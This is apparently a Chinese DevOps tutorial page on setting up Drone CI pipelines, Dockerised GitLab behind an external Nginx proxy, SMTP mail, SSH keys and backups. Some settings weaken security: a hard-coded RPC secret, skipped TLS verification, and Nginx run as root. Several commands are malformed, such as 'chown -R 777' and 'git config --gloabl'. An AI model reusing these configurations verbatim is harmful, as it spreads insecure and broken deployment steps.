class="hljs-bullet">-</span> <span class="hljs-string">/etc/localtime:/etc/localtime</span>  <span class="hljs-attr">drone-runner:</span>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">drone-runner</span>    <span class="hljs-attr">image:</span> <span class="hljs-string">drone/drone-runner-docker:latest</span>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span>    <span class="hljs-attr">depends_on:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">drone-server</span>    <span class="hljs-attr">volumes:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">/var/run/docker.sock:/var/run/docker.sock</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">/etc/timezone:/etc/timezone</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">/etc/localtime:/etc/localtime</span>    <span class="hljs-attr">environment:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">SET_CONTAINER_TIMEZONE=true</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">CONTAINER_TIMEZONE=Asia/Shanghai</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_RPC_PROTO=http</span>      <span class="hljs-comment"># 如果直接使用本配置，这儿不需要改，如果部署到DRONE_RUNNER_LABELS其他服务器，需要填server的域名</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_RPC_HOST=drone-server</span>      <span class="hljs-comment"># server配置的DRONE_RPC_SECRET</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_RPC_SECRET=07d3caaa3e2d2d33bc1ce18c60d43213</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_RUNNER_CAPACITY=2</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_RUNNER_NAME=drone-runner</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_RPC_SKIP_VERIFY=true</span>      <span class="hljs-comment"># 下面注释的是runner的控制台，没必要加上，server可以直接看到</span>      <span class="hljs-comment"># - DRONE_UI_USERNAME=root</span>      <span class="hljs-comment"># - DRONE_UI_PASSWORD=root</span>    <span class="hljs-comment"># ports:</span>    <span class="hljs-comment">#   - 3000:3000</span><span class="hljs-string">language-yml复制代码</span></code></pre><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><pre><code class="hljs yml"><span class="hljs-meta">---</span><span class="hljs-attr">kind:</span> <span class="hljs-string">pipeline</span><span class="hljs-attr">type:</span> <span class="hljs-string">docker</span><span class="hljs-attr">name:</span> <span class="hljs-string">default</span><span class="hljs-attr">clone:</span>  <span class="hljs-attr">depth:</span> <span class="hljs-number">2</span><span class="hljs-attr">steps:</span>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">restore-cache</span>    <span class="hljs-attr">image:</span> <span class="hljs-string">ccr.ccs.tencentyun.com/huangfamily/drone-volume-cache:0.1</span>    <span class="hljs-attr">settings:</span>      <span class="hljs-attr">restore:</span> <span class="hljs-literal">true</span>      <span class="hljs-attr">mount:</span>        <span class="hljs-bullet">-</span> <span class="hljs-string">./.npm-cache</span>        <span class="hljs-bullet">-</span> <span class="hljs-string">./node_modules</span>    <span class="hljs-attr">volumes:</span>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">cache</span>        <span class="hljs-attr">path:</span> <span class="hljs-string">/cache</span>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">npm-install</span>    <span class="hljs-attr">image:</span> <span class="hljs-string">ccr.ccs.tencentyun.com/huangfamily/node:16.14.0-alpine</span>    <span class="hljs-attr">commands:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">npm</span> <span class="hljs-string">config</span> <span class="hljs-string">set</span> <span class="hljs-string">cache</span> <span class="hljs-string">./.npm-cache</span> <span class="hljs-string">--global</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">npm</span> <span class="hljs-string">install</span>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">rebuild-cache</span>    <span class="hljs-attr">image:</span> <span class="hljs-string">ccr.ccs.tencentyun.com/huangfamily/drone-volume-cache:0.1</span>    <span class="hljs-attr">settings:</span>      <span class="hljs-attr">rebuild:</span> <span class="hljs-literal">true</span>      <span class="hljs-attr">mount:</span>        <span class="hljs-bullet">-</span> <span class="hljs-string">./.npm-cache</span>        <span class="hljs-bullet">-</span> <span class="hljs-string">./node_modules</span>    <span class="hljs-attr">volumes:</span>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">cache</span>        <span class="hljs-attr">path:</span> <span class="hljs-string">/cache</span>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">docker-build</span>    <span class="hljs-attr">image:</span> <span class="hljs-string">plugins/docker:20.10.9</span>    <span class="hljs-attr">settings:</span>      <span class="hljs-attr">registry:</span> <span class="hljs-string">registry.cn-guangzhou.aliyuncs.com</span>      <span class="hljs-attr">username:</span>        <span class="hljs-attr">from_secret:</span> <span class="hljs-string">docker_username</span>      <span class="hljs-attr">password:</span>        <span class="hljs-attr">from_secret:</span> <span class="hljs-string">docker_password</span>      <span class="hljs-attr">tag:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.1</span>      <span class="hljs-attr">dockerfile:</span> <span class="hljs-string">Dockerfile</span>      <span class="hljs-attr">repo:</span> <span class="hljs-string">registry.cn-guangzhou.aliyuncs.com/hjxstart/graduation_project</span>    <span class="hljs-attr">when:</span>      <span class="hljs-attr">status:</span> [<span class="hljs-string">push</span>]  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">deploy</span>    <span class="hljs-attr">image:</span> <span class="hljs-string">appleboy/drone-ssh:1.6.3</span>    <span class="hljs-attr">settings:</span>      <span class="hljs-attr">host:</span>        <span class="hljs-attr">from_secret:</span> <span class="hljs-string">PROD_IP</span>      <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>      <span class="hljs-attr">password:</span>        <span class="hljs-attr">from_secret:</span> <span class="hljs-string">PROD_PWD</span>      <span class="hljs-attr">port:</span> <span class="hljs-number">22</span>      <span class="hljs-attr">script:</span>        <span class="hljs-bullet">-</span> <span class="hljs-string">echo</span> <span class="hljs-string">====暂停容器开始=======</span>        <span class="hljs-bullet">-</span> <span class="hljs-string">docker</span> <span class="hljs-string">stop</span> <span class="hljs-string">graduation_project`</span>        <span class="hljs-bullet">-</span> <span class="hljs-string">docker</span> <span class="hljs-string">rm</span> <span class="hljs-string">-f</span> <span class="hljs-string">graduation_project`</span>        <span class="hljs-bullet">-</span> <span class="hljs-string">docker</span> <span class="hljs-string">images</span> <span class="hljs-string">|</span> <span class="hljs-string">grep</span> <span class="hljs-string">graduation_project</span>        <span class="hljs-bullet">-</span> <span class="hljs-string">docker</span> <span class="hljs-string">rmi</span> <span class="hljs-string">-f</span> <span class="hljs-string">`docker</span> <span class="hljs-string">images</span> <span class="hljs-string">|</span> <span class="hljs-string">grep</span> <span class="hljs-string">graduation_project</span> <span class="hljs-string">|</span> <span class="hljs-string">awk</span> <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span><span class="hljs-string">`</span>        <span class="hljs-bullet">-</span> <span class="hljs-string">echo</span> <span class="hljs-string">====开始部署=======</span>        <span class="hljs-bullet">-</span> <span class="hljs-string">docker</span> <span class="hljs-string">pull</span> <span class="hljs-string">registry.cn-guangzhou.aliyuncs.com/hjxstart/graduation_project:0.0.1</span>        <span class="hljs-bullet">-</span> <span class="hljs-string">docker</span> <span class="hljs-string">run</span> <span class="hljs-string">-p</span> <span class="hljs-number">5000</span><span class="hljs-string">:5000</span> <span class="hljs-string">-d</span> <span class="hljs-string">--name=graduation_project</span> <span class="hljs-string">registry.cn-guangzhou.aliyuncs.com/hjxstart/graduation_project:0.0.1</span>        <span class="hljs-bullet">-</span> <span class="hljs-string">docker</span> <span class="hljs-string">logs</span> <span class="hljs-string">graduation_project</span>        <span class="hljs-bullet">-</span> <span class="hljs-string">docker</span> <span class="hljs-string">ps</span> <span class="hljs-string">|</span> <span class="hljs-string">grep</span> <span class="hljs-string">graduation_project</span>        <span class="hljs-bullet">-</span> <span class="hljs-string">echo</span> <span class="hljs-string">====部署成功======</span>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">notification</span>    <span class="hljs-attr">image:</span> <span class="hljs-string">lddsb/drone-dingtalk-message:1.2.8</span>    <span class="hljs-attr">settings:</span>      <span class="hljs-attr">token:</span> <span class="hljs-string">https://oapi.dingtalk.com/robot/send?access_token=XXX</span>      <span class="hljs-attr">type:</span> <span class="hljs-string">markdown</span>      <span class="hljs-attr">secret:</span> <span class="hljs-string">SEC7fe9d27f27ea58d1d54dc602XXXXX</span>      <span class="hljs-attr">tpl_build_status_success:</span> <span class="hljs-string">&quot;流水线执行成功 🎉🎉🎉&quot;</span>      <span class="hljs-attr">tpl_build_status_failure:</span> <span class="hljs-string">&quot;流水线执行失败&quot;</span>      <span class="hljs-attr">tpl:</span> <span class="hljs-string">&quot;./dingtalk.tpl&quot;</span>    <span class="hljs-attr">when:</span>      <span class="hljs-attr">status:</span> [<span class="hljs-string">failure</span>, <span class="hljs-string">success</span>]<span class="hljs-attr">volumes:</span>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">cache</span>    <span class="hljs-attr">host:</span>      <span class="hljs-attr">path:</span> <span class="hljs-string">/tmp/cache/graduation_project</span><span class="hljs-string">language-yml复制代码</span></code></pre><h3 id="钉钉通知模板"><a href="#钉钉通知模板" class="headerlink" title="钉钉通知模板"></a>钉钉通知模板</h3><pre><code class="hljs tpl">[TPL_REPO_SHORT_NAME] [TPL_COMMIT_BRANCH] [TPL_BUILD_STATUS] 耗时[TPL_BUILD_CONSUMING]slanguage-tpl复制代码</code></pre><hr><h1 id="Gitlab"><a href="#Gitlab" class="headerlink" title="Gitlab"></a>Gitlab</h1><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><h3 id="运行-Gitlab"><a href="#运行-Gitlab" class="headerlink" title="运行 Gitlab"></a>运行 Gitlab</h3><pre><code class="hljs shell">sudo docker run --detach \  --hostname 192.168.18.199 \  --publish 20443:443 --publish 20080:80 --publish 20022:22 \  --name gitlab \  --restart always \  --volume /home/hjx/docker/gitlab/config:/etc/gitlab \  --volume /home/hjx/docker/gitlab/logs:/var/log/gitlab \  --volume /home/hjx/docker/gitlab/data:/var/opt/gitlab \  gitlab/gitlab-ce:latestlanguage-shell复制代码</code></pre><h3 id="Gitlab-重置密码"><a href="#Gitlab-重置密码" class="headerlink" title="Gitlab 重置密码"></a>Gitlab 重置密码</h3><pre><code class="hljs shell">docker exec -it gitlab /bin/bashgitlab-rails console -e productionuser = User.where(id: 1).firstuser.password = &#x27;密码&#x27;user.password_confirmation = &#x27;密码&#x27;user.save!language-shell复制代码</code></pre><h3 id="配置邮件和修改clone地址"><a href="#配置邮件和修改clone地址" class="headerlink" title="配置邮件和修改clone地址"></a>配置邮件和修改clone地址</h3><pre><code class="hljs shell">vim /etc/gitlab/gitlab.rbgitlab_rails[&#x27;time_zone&#x27;] = &#x27;Asia/Shanghai&#x27;gitlab_rails[&#x27;gitlab_email_display_name&#x27;] = &#x27;gitlab&#x27;gitlab_rails[&#x27;gitlab_email_from&#x27;] = &#x27;xiangjiandev@163.com&#x27;gitlab_rails[&#x27;smtp_enable&#x27;] = truegitlab_rails[&#x27;smtp_address&#x27;] = &quot;smtp.163.com&quot;gitlab_rails[&#x27;smtp_port&#x27;] = 465gitlab_rails[&#x27;smtp_user_name&#x27;] = &quot;xiangjiandev@163.com&quot;gitlab_rails[&#x27;smtp_password&#x27;] = &quot;授权码&quot;gitlab_rails[&#x27;smtp_domain&#x27;] = &quot;smtp.163.com&quot;gitlab_rails[&#x27;smtp_authentication&#x27;] = &quot;login&quot;gitlab_rails[&#x27;smtp_enable_starttls_auto&#x27;] = truegitlab_rails[&#x27;smtp_tls&#x27;] = trueuser[&quot;git_user_email&quot;] = &quot;xiangjiandev@163.com&quot;gitlab_rails[&#x27;gitlab_ssh_host&#x27;] = &#x27;192.168.52.129&#x27;gitlab_rails[&#x27;gitlab_shell_ssh_port&#x27;] = 8022docker exec -it gitlab /bin/bashgitlab-ctl reconfiguregitlab-ctl restartlanguage-shell复制代码</code></pre><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="业务要求"><a href="#业务要求" class="headerlink" title="业务要求"></a>业务要求</h3><ol><li>使用docker部署gitlab.</li><li>使用外部Nginx反向代理gitlab.</li><li>使用gitlab.xj.com域名访问gitlab.</li><li>使用Centos7.6</li><li>使用内网地址192.168.18.125</li></ol><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="docker安装gitlab镜像"><a href="#docker安装gitlab镜像" class="headerlink" title="docker安装gitlab镜像"></a>docker安装gitlab镜像</h3><ol><li>下载gitlab镜像</li></ol><pre><code class="hljs bash">docker pull gitlab/gitlab-ce复制代码</code></pre><ol><li>启动镜像</li></ol><pre><code class="hljs jboss-cli">docker run <span class="hljs-params">--detach</span> \<span class="hljs-params">--hostname</span> gitlab.xj.com \<span class="hljs-params">--publish</span> 20080<span class="hljs-function">:80</span> <span class="hljs-params">--publish</span> 20022<span class="hljs-function">:22</span> \<span class="hljs-params">--name</span> gitlab \<span class="hljs-params">--restart</span> always \<span class="hljs-params">--volume</span> <span class="hljs-string">/data/gitlab/config</span>:<span class="hljs-string">/etc/gitlab</span> \<span class="hljs-params">--volume</span> <span class="hljs-string">/data/gitlab/logs</span>:<span class="hljs-string">/var/log/gitlab</span> \<span class="hljs-params">--volume</span> <span class="hljs-string">/data/gitlab/data</span>:<span class="hljs-string">/var/opt/gitlab</span> \gitlab/gitlab-ce<span class="hljs-function">:latest</span>复制代码</code></pre><ol><li>测试本机安装的gitlab <code>http://192.168.18.125:20080</code></li></ol><h3 id="配置使用外部的nginx服务器"><a href="#配置使用外部的nginx服务器" class="headerlink" title="配置使用外部的nginx服务器"></a>配置使用外部的nginx服务器</h3><ol><li>关闭gitlab内部的nginx服务<a href="https://docs.gitlab.com/omnibus/settings/nginx.html#using-a-non-bundled-web-server">官网</a></li></ol><pre><code class="hljs awk">vim <span class="hljs-regexp">/data/gi</span>tlab<span class="hljs-regexp">/config/gi</span>tlab.rb复制代码</code></pre><p>在配置文件最末尾加上配置</p><pre><code class="hljs prolog">nginx[<span class="hljs-string">&#x27;enable&#x27;</span>] = false web_server[<span class="hljs-string">&#x27;external_users&#x27;</span>] = [<span class="hljs-string">&#x27;www-data&#x27;</span>]复制代码</code></pre><p>使配置生效</p><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> gitlab gitlab-ctl reconfigure复制代码</code></pre><ol><li>配置本机上的nginx.新nginx虚拟机配置文件，我的虚拟机配置文件在&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;vhost</li></ol><pre><code class="hljs vim">touch /usr/local/nginx/<span class="hljs-keyword">conf</span>/vhost/gitlab.xj.<span class="hljs-keyword">com</span>.<span class="hljs-keyword">conf</span><span class="hljs-keyword">vim</span> /usr/local/nginx/<span class="hljs-keyword">conf</span>/vhost/gitlab.xj.<span class="hljs-keyword">com</span>.<span class="hljs-keyword">conf</span>复制代码</code></pre><p>下载官方的配置文件<a href="https://gitlab.com/gitlab-org/gitlab-recipes/-/blob/master/web-server/nginx/gitlab-omnibus-nginx.conf">官网</a>.配置文件有http 和 https两个版本，这里我选择了http第一个</p><pre><code class="hljs coffeescript"><span class="hljs-comment">## GitLab 8.3+</span><span class="hljs-comment">##</span><span class="hljs-comment">## Lines starting with two hashes (##) are comments with information.</span><span class="hljs-comment">## Lines starting with one hash (#) are configuration parameters that can be uncommented.</span><span class="hljs-comment">##</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">####</span><span class="hljs-comment">##        CONTRIBUTING          ##</span><span class="hljs-comment">###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#</span><span class="hljs-comment">##</span><span class="hljs-comment">## If you change this file in a Merge Request, please also create</span><span class="hljs-comment">## a Merge Request on https://gitlab.com/gitlab-org/omnibus-gitlab/merge_requests</span><span class="hljs-comment">##</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#####</span><span class="hljs-comment">##         configuration         ##</span><span class="hljs-comment">###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><span class="hljs-comment">##</span><span class="hljs-comment">## See installation.md#using-https for additional HTTPS configuration details.</span>upstream gitlab-workhorse &#123;  <span class="hljs-comment"># On GitLab versions before 13.5, the location is</span>  <span class="hljs-comment"># `/var/opt/gitlab/gitlab-workhorse/socket`. Change the following line</span>  <span class="hljs-comment"># accordingly.</span>  <span class="hljs-comment"># 修改这里==================1</span>  server unix:/data/gitlab/data/gitlab-workhorse/sockets/socket;&#125;<span class="hljs-comment">## Normal HTTP host</span>server &#123;  <span class="hljs-comment">## Either remove &quot;default_server&quot; from the listen line below,</span>  <span class="hljs-comment">## or delete the /etc/nginx/sites-enabled/default file. This will cause gitlab</span>  <span class="hljs-comment">## to be served if you visit any address that your server responds to, eg.</span>  <span class="hljs-comment">## the ip address of the server (http://x.x.x.x/)n 0.0.0.0:80 default_server;</span>  listen <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>:<span class="hljs-number">80</span> default_server;  listen [::]:<span class="hljs-number">80</span> default_server;  <span class="hljs-comment"># 修改这里==================2</span>  server_name gitlab.xj.com; <span class="hljs-comment">## Replace this with something like gitlab.example.com</span>  server_tokens <span class="hljs-literal">off</span>; <span class="hljs-comment">## Don&#x27;t show the nginx version number, a security best practice</span>  root /opt/gitlab/embedded/service/gitlab-rails/public;  <span class="hljs-comment">## See app/controllers/application_controller.rb for headers set</span>  <span class="hljs-comment">## Individual nginx logs for this GitLab vhost</span>  access_log  /var/log/nginx/gitlab_access.log;  error_log   /var/log/nginx/gitlab_error.log;  location / &#123;    client_max_body_size <span class="hljs-number">0</span>;    gzip <span class="hljs-literal">off</span>;    <span class="hljs-comment">## https://github.com/gitlabhq/gitlabhq/issues/694</span>    <span class="hljs-comment">## Some requests take more than 30 seconds.</span>    proxy_read_timeout      <span class="hljs-number">300</span>;    proxy_connect_timeout   <span class="hljs-number">300</span>;    proxy_redirect          <span class="hljs-literal">off</span>;    proxy_http_version <span class="hljs-number">1.1</span>;    proxy_set_header    Host                $http_host;    proxy_set_header    X-Real-IP           $remote_addr;    proxy_set_header    X-Forwarded-For     $proxy_add_x_forwarded_for;    proxy_set_header    X-Forwarded-Proto   $scheme;    proxy_pass http://gitlab-workhorse;  &#125;&#125;复制代码</code></pre><ol><li>在nginx.conf上添加上</li></ol><pre><code class="hljs dts">vim <span class="hljs-keyword">/usr/</span>local<span class="hljs-keyword">/nginx/</span>conf/nginx.conf<span class="hljs-meta"># 1.配置成root用户，gitlab代理权限问题</span>user <span class="hljs-attr">root</span><span class="hljs-punctuation">;</span>worker_processes  <span class="hljs-number">1</span>...<span class="hljs-title class_">http</span> <span class="hljs-punctuation">&#123;</span>    ...    <span class="hljs-meta"># g zip</span>    <span class="hljs-meta"># 2.把配置文件包含进了</span>    include      <span class="hljs-keyword">/usr/</span>local<span class="hljs-keyword">/nginx/</span>conf<span class="hljs-keyword">/vhost/</span>gitlab.xj.com.<span class="hljs-attr">conf</span><span class="hljs-punctuation">;</span>....</code></pre><ol><li>配置完成后检查<code>./nginx -t</code> 是否正常，没问题重新载入配置即可。</li></ol><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">/usr/local/nginx/sbin/</span><span class="hljs-string">./nginx</span>  启动<span class="hljs-string">./nginx</span> -s stop  停止<span class="hljs-string">./nginx</span> -s <span class="hljs-keyword">quit</span>  安全退出<span class="hljs-string">./nginx</span> -s <span class="hljs-keyword">reload</span>  重新加载配置文件ps aux|grep nginx  查看nginx进程复制代码</code></pre><h3 id="修改目录权限"><a href="#修改目录权限" class="headerlink" title="修改目录权限"></a>修改目录权限</h3><pre><code class="hljs haskell"><span class="hljs-title">chown</span> -<span class="hljs-type">R</span> <span class="hljs-number">777</span> /<span class="hljs-class"><span class="hljs-keyword">data</span>/gitlab/<span class="hljs-keyword">data</span>/gitlab-workhorse/</span>复制代码</code></pre><h3 id="主要参考资料"><a href="#主要参考资料" class="headerlink" title="主要参考资料"></a>主要参考资料</h3><ol><li><a href="https://blog.csdn.net/aouoy/article/details/109798929">docker安装gitlab后的配置修改</a></li><li><a href="https://ssrvps.org/archives/5022">docker安装部署gitlab，docker安装部署gitlab配置使用外部nginx</a></li><li><a href="https://docs.docker.com/engine/install/centos/">Install Docker Engine on CentOS</a></li><li><a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">镜像加速器</a></li></ol><h2 id="GitLab私有部署"><a href="#GitLab私有部署" class="headerlink" title="GitLab私有部署"></a>GitLab私有部署</h2><ol><li>Centos7.6 (&#x2F;boot 需要2G)</li><li>gitlab-ce-12.5.2-ce.0.el7.x86_64.rpm</li></ol><hr><h3 id="安装GitLab"><a href="#安装GitLab" class="headerlink" title="安装GitLab"></a>安装GitLab</h3><pre><code class="hljs bash">yum localinstall gitlab-ce-12.5.2-ce.0.el7.x86_64.rpm</code></pre><hr><ol><li>修改配置文件</li></ol><h3 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h3><ol><li>Gitlab 邮箱配置</li></ol><pre><code class="hljs bash">vim /etc/gitlab/gitlab.rb<span class="hljs-comment"># 将external_url 变量的地址修改为gitlab 所在centos 的ip 地址。</span>external_url <span class="hljs-string">&#x27;http://gitlab.example.com&#x27;</span><span class="hljs-comment"># 因为修改了配置文件，故需要重新加载配置内容</span>gitlab-ctl reconfiguregitlab-ctl restart<span class="hljs-comment"># 修改配置文件</span>vim /etc/gitlab/gitlab.rb<span class="hljs-comment"># 添加以下配置</span>gitlab_rails[<span class="hljs-string">&#x27;time_zone&#x27;</span>] = <span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>gitlab_rails[<span class="hljs-string">&#x27;gitlab_email_display_name&#x27;</span>] = <span class="hljs-string">&#x27;gitlab&#x27;</span>gitlab_rails[<span class="hljs-string">&#x27;gitlab_email_from&#x27;</span>] = <span class="hljs-string">&#x27;hjxstart@163.com&#x27;</span>gitlab_rails[<span class="hljs-string">&#x27;smtp_enable&#x27;</span>] = <span class="hljs-literal">true</span>gitlab_rails[<span class="hljs-string">&#x27;smtp_address&#x27;</span>] = <span class="hljs-string">&quot;smtp.163.com&quot;</span>gitlab_rails[<span class="hljs-string">&#x27;smtp_port&#x27;</span>] = 465gitlab_rails[<span class="hljs-string">&#x27;smtp_user_name&#x27;</span>] = <span class="hljs-string">&quot;hjxstart@163.com&quot;</span>gitlab_rails[<span class="hljs-string">&#x27;smtp_password&#x27;</span>] = <span class="hljs-string">&quot;授权码&quot;</span>gitlab_rails[<span class="hljs-string">&#x27;smtp_domain&#x27;</span>] = <span class="hljs-string">&quot;smtp.163.com&quot;</span>gitlab_rails[<span class="hljs-string">&#x27;smtp_authentication&#x27;</span>] = <span class="hljs-string">&quot;login&quot;</span>gitlab_rails[<span class="hljs-string">&#x27;smtp_enable_starttls_auto&#x27;</span>] = <span class="hljs-literal">true</span>gitlab_rails[<span class="hljs-string">&#x27;smtp_tls&#x27;</span>] = <span class="hljs-literal">true</span>user[<span class="hljs-string">&quot;git_user_email&quot;</span>] = <span class="hljs-string">&quot;hjxstart@163.com&quot;</span><span class="hljs-comment"># 测试配置是否成功</span>gitlab-rails console<span class="hljs-comment"># 发送邮箱</span>Notify.test_email(<span class="hljs-string">&#x27;hjxstart@163.com&#x27;</span>,<span class="hljs-string">&#x27;test mail&#x27;</span>, <span class="hljs-string">&#x27;test mail&#x27;</span>).deliver_now</code></pre><ol><li>第一次使用root 登陆</li></ol><ul><li>在浏览器输入ip地址即可</li></ul><h2 id="Gitlab-使用流程"><a href="#Gitlab-使用流程" class="headerlink" title="Gitlab 使用流程"></a>Gitlab 使用流程</h2><h3 id="账号的申请"><a href="#账号的申请" class="headerlink" title="账号的申请"></a>账号的申请</h3><ol><li>开发人员提供以下资料给管理员：姓名（用于展示用户项目）；邮箱（用于接受密码接收推送通知等）</li><li>收到重置密码邮箱之后进行密码重置，密码需要设置8为以上，建议使用自己的姓名+数字组成</li><li>账号申请，组对应公司里开发团队</li><li>创建账号，分别创建用户pm(项目经理)、dev1(开发1)、dev2(开发2)、test1(测试一)。账号创建后默认密码会发送邮件，第一次登陆哟去修改密码</li><li>用户加入组: pm用户作为组的所有者</li></ol><h3 id="客户端安装"><a href="#客户端安装" class="headerlink" title="客户端安装"></a>客户端安装</h3><ol><li>首先安装git</li><li>然后安装TortoiseGit</li></ol><h3 id="SSH-key-使用"><a href="#SSH-key-使用" class="headerlink" title="SSH key 使用"></a>SSH key 使用</h3><ol><li>生成ssh key</li></ol><ul><li>方法一：可视化创建ssh key, 在任意文件夹下点击右键，选择 Git GUI Here。在弹出的程序中选择主菜单的[Help] -&gt; [Show SSH Key]</li><li>方法二：命令行方式创建ssh key</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># linux</span><span class="hljs-comment"># 默认为rsa加密算法</span>ssh-keygen -C <span class="hljs-string">&quot;hjxstart@126.com&quot;</span> -f ~/.ssh/id_rsa -N <span class="hljs-string">&#x27;&#x27;</span> -q<span class="hljs-comment"># -t: 指定为dsa加密算法; -f: 指定存放的位置; -C: 邮箱；-P 密码; -q: 静默模式</span>ssh-keygen -t dsa -f ~/.ssh/id_dsa -C <span class="hljs-string">&quot;hjxstart@126.com&quot;</span> -P <span class="hljs-string">&#x27;&#x27;</span> -q<span class="hljs-comment"># windows</span>ssh-keygen.exe -f ~/.ssh/id_rsa -C <span class="hljs-string">&quot;hjxstart@126.com&quot;</span> -N <span class="hljs-string">&#x27;&#x27;</span> -q</code></pre><ol><li>查看 SSH key</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ~/.sshid_rsa.pub</code></pre><ol><li>添加 SSH key。</li></ol><ul><li>打开Gitlab 登录自己的账号</li><li>进入用户设置，找到SSHkeys</li><li>点击右侧 Add SSH Key</li><li>输入上一步生成的key</li><li>点击Add key 即添加成功一个key</li></ul><h3 id="新建项目规则"><a href="#新建项目规则" class="headerlink" title="新建项目规则"></a>新建项目规则</h3><ol><li>创建项目组</li><li>使用之前创建的项目组。</li><li>进行添加用户。</li><li>项目经理指定开发计划<br>app 需求 开发者 完成日期<br>v1.0 首页 dev1 2.5<br>新闻 dev1 2.7<br>支付 dev2 2.7<br>博客 dev2 2.8</li></ol><ul><li>创建里程碑 lssues &gt; Miletones &gt; new Miletones (Title: v1.0; Description: 官网v1.0)</li><li>分配任务 lssues &gt; new lssues（Title:首页; Descripiton: 首页开发；Assignce(指派): dev1；Miletones: v1.0;结束时间）</li></ul><h3 id="项目检出check"><a href="#项目检出check" class="headerlink" title="项目检出check"></a>项目检出check</h3><pre><code class="hljs bash"><span class="hljs-comment"># 1. 克隆项目</span>git <span class="hljs-built_in">clone</span> <span class="hljs-comment"># 2. 配置用户信息</span>git config --gloabl user.name dev1git config --gloabl user.email dev1@126.com<span class="hljs-comment"># 3. 创建分支branch</span>git branch branchName<span class="hljs-comment"># 4. 代码提交Commit</span>git commit -m <span class="hljs-string">&quot;我是提交描述&quot;</span><span class="hljs-comment"># 提交时可以带上需要关闭的任务编号，确认请求会自动关闭问题</span>git commit -m <span class="hljs-string">&quot;close #2&quot;</span><span class="hljs-comment"># 5. 代码拉取Pull</span>git Pull<span class="hljs-comment"># 6. 代码推送Push</span>git push<span class="hljs-comment"># 7. 代码标签tag</span><span class="hljs-comment"># 8. 代码冲突解决</span><span class="hljs-comment"># 9. 创建忽略文件</span>.gitignore<span class="hljs-comment"># 10. 发出合并请求,先登录 dev1， Merge Requests &gt; new merge request （选择 index分支）。</span><span class="hljs-comment"># Assignee: pm(指派给项目经理合并，权限)； 里程碑 Mileestone（V1.0）</span><span class="hljs-comment"># 11. 项目经理登录确认合并请求</span><span class="hljs-comment"># 12. 项目经理可以去 issues 手动关闭任务</span></code></pre><h2 id="Gitlab备份与回复"><a href="#Gitlab备份与回复" class="headerlink" title="Gitlab备份与回复"></a>Gitlab备份与回复</h2><h3 id="备份管理"><a href="#备份管理" class="headerlink" title="备份管理"></a>备份管理</h3><ol><li>配置文件中加入 # vim &#x2F;etc&#x2F;gitlab&#x2F;gitlab.rb</li></ol><pre><code class="hljs bash">gitlab_rails[<span class="hljs-string">&#x27;backup_path&#x27;</span>] = <span class="hljs-string">&#x27;/data/backup/gitlab&#x27;</span>gitlab_rails[<span class="hljs-string">&#x27;backup_keep_time&#x27;</span>] = 604800</code></pre><ol><li>重置配置: gitlab-ctl reconfigure</li><li>如果自定义备份目录需要赋予git权限</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /data/backup/gitlab -p<span class="hljs-built_in">chown</span> -R git.git /data/backup/gitlab</code></pre><ol><li>重置配置: gitlab-ctl reconfigure</li><li>手动备份</li></ol><pre><code class="hljs bash">gitlab-rake gitlab:backup:create</code></pre><ol><li>查看备份</li></ol><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /data/backup/gitlab 